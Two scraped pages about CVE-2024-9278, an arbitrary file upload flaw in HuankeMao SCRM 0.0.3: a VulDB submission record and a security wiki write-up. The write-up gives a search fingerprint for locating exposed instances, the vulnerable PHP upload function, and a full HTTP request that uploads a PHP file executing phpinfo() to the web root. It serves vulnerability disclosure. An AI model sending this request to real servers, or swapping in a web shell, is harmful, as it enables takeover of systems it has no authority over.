=== Content from vuldb.com_c5d6eef5_20250110_181839.html ===
![VulDB](/_thm/vuldb.png)

* Home
  + Overview
  + [Live Recent](?live.recent)
  + [Live Updates](?live.updates)
  + [Live Archive](?live.archive)
  + [Live Submits](?live.submits)
* [Entries](?recent)
  + [Recent](?recent)
  + [Updates](?updates)
  + [Commits](?commits)
  + [Archive](?archive)
  + [CNA](?cna)
  + [Stats](?stats)
  + [Submits](?submits)
  + [Add](?id.add)
* [Products](?product)
  + [Vendor](?vendor)
  + [Product](?product)
  + [Type](?type)
* [Risk](?cvssv3)
  + [CVSSv4](?cvssv4)
  + [CVSSv3](?cvssv3)
  + [CVSSv2](?cvssv2)
  + [Risks](?risk)
  + [Exploits](?exploits)
* [Threat](?cti)
  + [Analysis](?cti.analyze)
  + [Activities](?activities)
  + [Events](?events)
  + [Actors](?actor)
  + [IP addresses](?ip)
  + [Country](?country)
  + [Sector](?sector)
  + [Exploit Prices](?exploitprices)
* [References](?references)
  + [References](?references)
  + [Tools](?tools)
  + [Videos](?videos)
  + [Google Hacking](?googlehacking)
  + [Exports](?export)
* [Search](?search)

  + [Search](?search)
  + [Advanced Search](?search.advanced)
  + [User](?user)
  + [Feeds](?feeds)
  + [API](?kb.api)
* [Support](?kb)
  + [Knowledge Base](?kb)
  + [FAQ](?kb.faq)
  + [Changelog](?kb.changelog)
  + [Roadmap](?kb.roadmap)
  + [Status](?status)
  + [Contact](?contact)
* [Login](?login)
  + [Login](?login)
  + [Signup](?signup)
  + [Purchase](?pay)
  + [Terms of Use](?kb.terms)

* [Live](?live.submits)
* [Submits](?submits)
* [Add](?id.add)
* [Policy](?kb.submission)
* [Purchase](?pay)

[Login](?login)[Signup](?signup)ğŸ›¡ Home[Submit](?submit)410393
# Submit #410393: Huankemao SCRM 0.0.3 Unrestricted Upload[info](?kb.submission)

| Title | Huankemao SCRM 0.0.3 Unrestricted Upload |
| --- | --- |
| Description | HuankeMao SCRM is a data-driven, finely operated service system based on Enterprise WeChat, helping businesses achieve intelligent, simple, friendly, and detailed customer operation management. There is an arbitrary file upload vulnerability in the backend of the HuanKeMao SCRM 0.0.3. Attackers can exploit this vulnerability to upload backdoor files and gain server privileges. Githubï¼šhttps://github.com/huankemao/huankemao-php The vulnerability is located in the `upload\_domain\_verification\_file` function of the `WxkConfig.php` file in the `app\admin\controller\v1` directory. |
| Source | âš ï¸ https://wiki.shikangsi.com/post/share/96b7d919-1749-4e2b-bda2-b80d2fd23865 |
| User | [wiki (UID 72124)](?user.72124) |
| Submission | 09/18/2024 11:33 AM (4 months ago) |
| Moderation | 09/27/2024 07:36 AM (9 days later) |
| Status | [Accepted](?kb.submission) |
| VulDB Entry | [278660](?id.278660) [HuankeMao SCRM up to 0.0.3 Administrator Backend WxkConfig.php upload\_domain\_verification\_file unrestricted upload] |
| Points | 20 |

[â—‚ Previous](?submit.410392)[Overview](?submit)[Next â–¸](?submit.410394)

# Do you need the next level of professionalism?

Upgrade your account now!

## Notice

Submissions are made by [VulDB community users](?user). VulDB is *not responsible* for their content nor the links to external sources.

Please use the raw information shown and the links listed *with caution*. They might contain malicious and harmful actions, code or data.

The corresponding VulDB entries contain the moderated, verified, and normalized information provided within the raw submission.

## Documentation

* [Submission Policy](?kb.submission)
* [Data Processing](?kb.processing)
* [CVE Handling](?kb.cna)
[Â© 1997-2025 vuldb.com](?kb.terms) Â· [cc by-nc-sa](https://creativecommons.org/licenses/by-nc-sa/4.0/)[de](/de/?submit.410393 "German") Â· [fr](/fr/?submit.410393 "French") Â· [it](/it/?submit.410393 "Italian") Â· [es](/es/?submit.410393 "Spanish") Â· [pt](/pt/?submit.410393 "Portuguese") Â· [ru](/ru/?submit.410393 "Russian") Â· [pl](/pl/?submit.410393 "Polish") Â· [sv](/sv/?submit.410393 "Swedish") Â· [zh](/zh/?submit.410393 "Chinese") Â· [ja](/ja/?submit.410393 "Japanese") Â· [ar](/ar/?submit.410393 "Arabic")[v18.14.7](?kb.changelog)

=== Content from wiki.shikangsi.com_42264262_20250110_181841.html ===

# å®‰å…¨å›¢é˜Ÿè´¡çŒ®å¹³å°

å¯¼èˆªåˆ‡æ¢

* [é¦–é¡µ](/)
* æ‰€æœ‰ä¿¡æ¯
  + [æ‰€æœ‰æƒ…æŠ¥](/list/all/)
  + [æ¨èä¸“åŒº](/list/recommend/)
  + [ç»¼åˆæƒ…æŠ¥](/list/wiki/)
  + [ç”¨æˆ·æäº¤](/list/userpost/)
  + [é«˜æ ¡æƒ…æŠ¥](/list/school/)
* [æ’è¡Œæ¦œ](/user/)
* [ç¤¼å“ä¸­å¿ƒ](/gift/)
* [æœç´¢](/search/)
* [å…¬å‘Š](/announcements/)
* [IPwhoisæ–°åŠŸèƒ½](/ip/)
* [WooYun dropsæ–°åŠŸèƒ½](/wooyun/)
* æ›´å¤š
  + [edudataå¹³å°](https://wiki.shikangsi.com/cas/jump/edudata)
  + [é›¶ç»„çŸ¥è¯†åº“-006åº”æ€¥å“åº”ç›®å½•](https://wiki.shikangsi.com/post/3629/)
  + [é›¶ç»„çŸ¥è¯†åº“-007å†…ç½‘æ¸—é€ç›®å½•](https://wiki.shikangsi.com/post/3631/)
  + [é›¶ç»„çŸ¥è¯†åº“-009å®‰å…¨æŠ€æœ¯ç›®å½•](https://wiki.shikangsi.com/post/3632/)
  + [é›¶ç»„çŸ¥è¯†åº“-010åŸŸæ¸—é€ç›®å½•](https://wiki.shikangsi.com/post/3633/)
  + [é›¶ç»„çŸ¥è¯†åº“-011è¿ç»´ä¸äºŒè¿›åˆ¶å®‰å…¨ç›®å½•](https://wiki.shikangsi.com/post/3634/)
  + [XSSå¹³å°](https://wiki.shikangsi.com/cas/jump/xss)
  + [edusrcæ•°æ®åˆ†æ](http://data.shikangsi.com/)
  + [å‹æƒ…é“¾æ¥](https://wiki.shikangsi.com/links/)
  + [wikiç¤¾åŒº](https://wiki.shikangsi.com/zone/)

[æäº¤è´¡çŒ®](/add/)

[ç™»å½•](/login/)

[æ³¨å†Œ](/register/)

# ã€åŸåˆ›ã€‘ï¼ˆCVE-2024-9278ï¼‰HuankeMao SCRM <=0.0.3 æ–‡ä»¶ä¸Šä¼ æ¼æ´

---

åˆ†äº«
### å½“å‰ä¸ºç§å¯†åˆ†äº«ï¼Œæ— éœ€ç™»å½•å³å¯æŸ¥çœ‹ã€‚

---

| æ—¶é—´ | ä½œè€… | å¯è§æ€§ | ç­‰çº§ | Rank |
| --- | --- | --- | --- | --- |
|| 2024-09-16 19:58:23 | [jackieya](/profile/948/) | å…¬å¼€çš„ | é«˜å± | 3 |
| --- | --- | --- | --- | --- |

CVE-2024-9278
Created: 09/27/2024 07:41 AM
Changes: 09/27/2024 07:41 AM (57)
Submitter: jackieya@wiki

---

# æ¼æ´æè¿°

> å”¤å®¢çŒ«SCRM æ˜¯ä¸€æ¬¾åŸºäºä¼ä¸šå¾®ä¿¡çš„æ•°æ®åŒ–ç²¾ç»†è¿è¥æœåŠ¡ç³»ç»Ÿï¼Œå¸®åŠ©ä¼ä¸šå®ç°æ™ºæ…§ã€ç®€å•ã€å‹å¥½ã€ç²¾ç»† çš„å®¢æˆ·è¿è¥ç®¡ç†ã€‚

å”¤å®¢çŒ«SCRM <=0.0.3 çš„ç®¡ç†å‘˜åå°å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¯¥æ¼æ´ä¸Šä¼ åé—¨æ–‡ä»¶ä»è€Œè·å–æœåŠ¡å™¨æƒé™ã€‚

```
- HuankeMao SCRM is a data-driven, finely operated service system based on Enterprise WeChat, helping businesses achieve intelligent, simple, friendly, and detailed customer operation management.
- There is an arbitrary file upload vulnerability in the backend of the HuanKeMao SCRM 0.0.3. Attackers can exploit this vulnerability to upload backdoor files and gain server privileges.

```

githubé¡¹ç›®åœ°å€ï¼šhttps://github.com/huankemao/huankemao-php

```
Githubï¼šhttps://github.com/huankemao/huankemao-php

```
# èµ„äº§æµ‹ç»˜

`body="å”¤å®¢çŒ«"`

![null](/media/images/2024/09/16/4be98b13-31fe-4566-87ff-61361c216f38-esPI3ttS.png)

![null](/media/images/2024/09/16/97f4c225-699a-4210-bc10-e230b192e43c-B1lrolt1.png)

# æ¼æ´åˆ†æ

æ¼æ´ç‚¹ä½äºapp\admin\controller\v1\WxkConfig.phpçš„upload\_domain\_verification\_fileå‡½æ•°ä¸­ï¼š

```
- The vulnerability is located in the `upload_domain_verification_file` function of the `WxkConfig.php` file in the `app\admin\controller\v1` directory.

```
```
public function upload_domain_verification_file(){
        if (!isset($_FILES['domain_verification_file'])){
            response(500, 'æ–‡ä»¶ä¸ºç©º');
        }
        move_uploaded_file($_FILES['domain_verification_file']['tmp_name'], $_FILES['domain_verification_file']['name']);

        response(200, 'æ“ä½œæˆåŠŸ', $_SERVER['HTTP_HOST'] . '/' . $_FILES['domain_verification_file']['name']);
    }

```

è¿™é‡Œæ²¡æœ‰å¯¹ä¸Šä¼ æ–‡ä»¶è¿›è¡Œä¸¥æ ¼æ ¡éªŒï¼Œç›´æ¥ä¸Šä¼ åˆ°ç½‘ç«™æ ¹ç›®å½•äº†ã€‚

```
- There is no verification for the upload file type here, you can directly upload the file to the website root directory

```
# POC

è¯¥æ¼æ´éœ€è¦ç™»å½•åˆ°åå°è¿›è¡Œåˆ©ç”¨ï¼š

```
- This vulnerability requires logging into the backend for exploitation
- After logging in, click on the "Settings" icon in the upper right corner of the page

```

![null](/media/images/2024/09/16/44b0c57b-cdd4-4028-8b4b-0cb2e6621c75-7vQi4j5Y.png)

ç‚¹å‡»â€œä¸Šä¼ æ ¡éªŒæ–‡ä»¶â€æŒ‰é’®

```
- Click the "Upload verification file" button

```

![null](/media/images/2024/09/16/56aa1835-5c83-4a57-9b28-f48a6be6138c-C7INlM5O.png)

ä¸Šä¼ ä¸ªtxtæ–‡ä»¶åæŠ“åŒ…ï¼Œå°†æ–‡ä»¶åç¼€æ”¹ä¸ºphpï¼Œå¾—åˆ°ä¸‹é¢è¿™ä¸ªpocï¼š

```
- After uploading a txt file and intercepting the data packet, change the file suffix to php to obtain the following POC:

```
```
POST /admin.php/upload_domain_verification_file HTTP/1.1
Host: 127.0.0.1:83
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Length: 685

------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="time"

1726487021
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="user_id"

71712684-324d-dbcc-f654-fee216e6453e
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="token"

fa4808a150e55b8aec0aa1bbea7438174e265464
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="sign"

46908fde63883cae06d059a4972809dd
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ
Content-Disposition: form-data; name="domain_verification_file"; filename="1.php"
Content-Type: text/plain

<?php phpinfo();?>
------WebKitFormBoundaryYUNSO2a0qBTk9UVQ--

```

ä¸Šä¼ åè®¿é—®http://127.0.0.1:83/1.php,æˆåŠŸæ‰§è¡Œphpinfo()ä»£ç 

```
- Access after uploading http://127.0.0.1:83/1.php Successfully executed the php info () code

```

![null](/media/images/2024/09/16/7c4311ca-f4b1-41a2-a9ae-49391ebdbbfb-4n5NIJzU.png)

---

å®¡æ ¸è¯„ä»·ï¼š æ²¡æœ‰ä»»ä½•è¯„ä»·...

2014-2022 Â© è”ç³»é‚®ç®±ï¼šadmin@sg95.cnÂ Â Â Â [é„‚ICPå¤‡15020128å·-4](https://beian.miit.gov.cn)


